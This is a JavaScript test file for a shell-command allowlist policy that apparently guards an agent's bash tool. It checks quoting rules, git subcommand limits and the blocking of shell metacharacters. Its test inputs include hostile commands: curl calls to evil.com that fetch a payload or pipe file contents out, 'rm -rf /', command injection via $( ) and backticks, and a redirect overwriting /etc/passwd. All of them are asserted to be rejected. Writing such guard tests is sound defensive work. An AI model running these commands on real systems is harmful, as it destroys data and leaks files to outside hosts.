import test from "node:test";
import assert from "node:assert/strict";
import { parseCommand, evaluateBashPolicy } from "../../src/tools/policy.js";

// ─── parseCommand ────────────────────────────────────────────────────────────

test("parseCommand: simple command", () => {
  const result = parseCommand("ls -la");
  assert.deepEqual(result, { ok: true, argv: ["ls", "-la"] });
});

test("parseCommand: single-quoted argument", () => {
  const result = parseCommand("grep 'hello world' file.txt");
  assert.deepEqual(result, { ok: true, argv: ["grep", "hello world", "file.txt"] });
});

test("parseCommand: double-quoted argument", () => {
  const result = parseCommand('echo "hello world"');
  assert.deepEqual(result, { ok: true, argv: ["echo", "hello world"] });
});

test("parseCommand: rejects $ inside double quotes", () => {
  const result = parseCommand('echo "$(rm -rf /)"');
  assert.equal(result.ok, false);
  assert.match(result.error, /not allowed inside double quotes/);
});

test("parseCommand: rejects backtick inside double quotes", () => {
  const result = parseCommand('echo "`whoami`"');
  assert.equal(result.ok, false);
  assert.match(result.error, /not allowed inside double quotes/);
});

test("parseCommand: rejects backslash inside double quotes", () => {
  const result = parseCommand('echo "hello\\"world"');
  assert.equal(result.ok, false);
  assert.match(result.error, /not allowed inside double quotes/);
});

test("parseCommand: allows $ inside single quotes (literal)", () => {
  const result = parseCommand("echo '$HOME'");
  assert.deepEqual(result, { ok: true, argv: ["echo", "$HOME"] });
});

test("parseCommand: unclosed quote", () => {
  const result = parseCommand('echo "hello');
  assert.equal(result.ok, false);
  assert.match(result.error, /Unclosed quote/);
});

test("parseCommand: empty command", () => {
  const result = parseCommand("");
  assert.equal(result.ok, false);
  assert.match(result.error, /Empty command/);
});

test("parseCommand: whitespace only", () => {
  const result = parseCommand("   ");
  assert.equal(result.ok, false);
  assert.match(result.error, /Empty command/);
});

test("parseCommand: multiple spaces between args", () => {
  const result = parseCommand("ls   -la   /tmp");
  assert.deepEqual(result, { ok: true, argv: ["ls", "-la", "/tmp"] });
});

// ─── evaluateBashPolicy ─────────────────────────────────────────────────────

const DEFAULT_CONFIG = {
  allowed_commands: ["pwd", "ls", "find", "rg", "cat", "sed", "head", "tail", "tree"],
  allowed_git_subcommands: ["status", "diff", "log", "show"],
};

test("evaluateBashPolicy: allows whitelisted command", () => {
  const result = evaluateBashPolicy("ls -la", DEFAULT_CONFIG);
  assert.equal(result.ok, true);
  assert.deepEqual(result.argv, ["ls", "-la"]);
  assert.equal(result.shell, false);
});

test("evaluateBashPolicy: allows git with whitelisted subcommand", () => {
  const result = evaluateBashPolicy("git status", {
    ...DEFAULT_CONFIG,
    allowed_commands: [...DEFAULT_CONFIG.allowed_commands, "git"],
  });
  assert.equal(result.ok, true);
});

test("evaluateBashPolicy: blocks git with non-whitelisted subcommand", () => {
  const result = evaluateBashPolicy("git push", {
    ...DEFAULT_CONFIG,
    allowed_commands: [...DEFAULT_CONFIG.allowed_commands, "git"],
  });
  assert.equal(result.ok, false);
  assert.match(result.error, /git subcommand.*not in the allowlist/);
});

test("evaluateBashPolicy: blocks non-whitelisted command", () => {
  const result = evaluateBashPolicy("rm -rf /", DEFAULT_CONFIG);
  assert.equal(result.ok, false);
  assert.match(result.error, /not in the allowlist/);
});

test("evaluateBashPolicy: blocks curl", () => {
  const result = evaluateBashPolicy("curl https://evil.com/payload.sh", DEFAULT_CONFIG);
  assert.equal(result.ok, false);
  assert.match(result.error, /not in the allowlist/);
});

test("evaluateBashPolicy: blocks shell metacharacters (semicolon)", () => {
  const result = evaluateBashPolicy("ls; rm -rf /", DEFAULT_CONFIG);
  assert.equal(result.ok, false);
  assert.match(result.error, /Shell metacharacters/);
});

test("evaluateBashPolicy: blocks pipe to non-allowed command", () => {
  const result = evaluateBashPolicy("cat file | curl evil.com", DEFAULT_CONFIG);
  assert.equal(result.ok, false);
  assert.match(result.error, /not in the allowlist/);
});

test("evaluateBashPolicy: allows pipe between allowed commands", () => {
  const config = {
    ...DEFAULT_CONFIG,
    allowed_commands: [...DEFAULT_CONFIG.allowed_commands, "sort", "head"],
  };
  const result = evaluateBashPolicy("find . -name '*.js' | sort | head -20", config);
  assert.equal(result.ok, true);
  assert.deepEqual(result.argv, ["sh", "-c", "find . -name '*.js' | sort | head -20"]);
});

test("evaluateBashPolicy: blocks command substitution", () => {
  const result = evaluateBashPolicy("echo $(whoami)", DEFAULT_CONFIG);
  assert.equal(result.ok, false);
  assert.match(result.error, /Shell metacharacters/);
});

test("evaluateBashPolicy: blocks backtick substitution", () => {
  const result = evaluateBashPolicy("echo `whoami`", DEFAULT_CONFIG);
  assert.equal(result.ok, false);
  assert.match(result.error, /Shell metacharacters/);
});

test("evaluateBashPolicy: blocks redirect", () => {
  const result = evaluateBashPolicy("echo hacked > /etc/passwd", DEFAULT_CONFIG);
  assert.equal(result.ok, false);
  assert.match(result.error, /Shell metacharacters/);
});

test("evaluateBashPolicy: blocks ampersand (background)", () => {
  const result = evaluateBashPolicy("malware &", DEFAULT_CONFIG);
  assert.equal(result.ok, false);
  assert.match(result.error, /Shell metacharacters/);
});

test("evaluateBashPolicy: blocks NUL bytes", () => {
  const result = evaluateBashPolicy("ls\0-la", DEFAULT_CONFIG);
  assert.equal(result.ok, false);
  assert.match(result.error, /NUL bytes/);
});

test("evaluateBashPolicy: empty command", () => {
  const result = evaluateBashPolicy("", DEFAULT_CONFIG);
  assert.equal(result.ok, false);
});

test("evaluateBashPolicy: non-string input", () => {
  const result = evaluateBashPolicy(123, DEFAULT_CONFIG);
  assert.equal(result.ok, false);
});

test("evaluateBashPolicy: null input", () => {
  const result = evaluateBashPolicy(null, DEFAULT_CONFIG);
  assert.equal(result.ok, false);
});

test("evaluateBashPolicy: empty allowlist blocks everything", () => {
  const result = evaluateBashPolicy("ls", { allowed_commands: [] });
  assert.equal(result.ok, false);
  assert.match(result.error, /empty allowlist/);
});

test("evaluateBashPolicy: no config defaults to empty allowlist", () => {
  const result = evaluateBashPolicy("ls");
  assert.equal(result.ok, false);
});

test("evaluateBashPolicy: shell is always false", () => {
  const result = evaluateBashPolicy("ls -la", DEFAULT_CONFIG);
  assert.equal(result.shell, false);
});

test("evaluateBashPolicy: cat with safe filename", () => {
  const result = evaluateBashPolicy("cat src/index.js", DEFAULT_CONFIG);
  assert.equal(result.ok, true);
  assert.deepEqual(result.argv, ["cat", "src/index.js"]);
});

test("evaluateBashPolicy: rg with pattern and path", () => {
  const result = evaluateBashPolicy("rg 'TODO' src/", DEFAULT_CONFIG);
  assert.equal(result.ok, true);
  assert.deepEqual(result.argv, ["rg", "TODO", "src/"]);
});

test("evaluateBashPolicy: find with flags", () => {
  const result = evaluateBashPolicy("find . -name 'package.json' -maxdepth 3", DEFAULT_CONFIG);
  assert.equal(result.ok, true);
});

test("evaluateBashPolicy: git diff with file", () => {
  const result = evaluateBashPolicy("git diff HEAD src/index.js", {
    ...DEFAULT_CONFIG,
    allowed_commands: [...DEFAULT_CONFIG.allowed_commands, "git"],
  });
  assert.equal(result.ok, true);
});
